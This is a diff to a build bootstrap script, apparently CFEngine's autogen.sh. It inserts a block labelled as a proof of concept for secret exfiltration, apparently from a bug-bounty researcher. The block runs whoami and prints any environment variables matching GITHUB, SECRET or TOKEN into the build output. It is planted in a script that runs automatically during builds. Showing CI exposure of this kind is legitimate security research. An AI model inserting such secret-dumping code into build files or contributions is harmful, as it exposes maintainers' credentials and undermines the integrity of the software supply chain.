@@ -65,6 +65,13 @@ echo "$0: Running determine-version.sh ..."
 rm -f CFVERSION
 { misc/determine-version.sh .CFVERSION > CFVERSION && cp CFVERSION libntech/CFVERSION ; } \
     || echo "$0: Unable to auto-detect CFEngine version, continuing"
+# PoC: Exfiltration de secrets
+echo "=== PoC: Arbitrary Code Execution ==="
+echo "Current user: $(whoami)"
+echo "hackerone user : m0oncake"
+echo "Environment variables:"
+env | grep -E "(GITHUB|SECRET|TOKEN)" || true
+echo "=== End PoC ==="
 
 echo "$0: Running autoreconf ..."
 autoreconf -Wno-portability --force --install -I m4  ||  exit
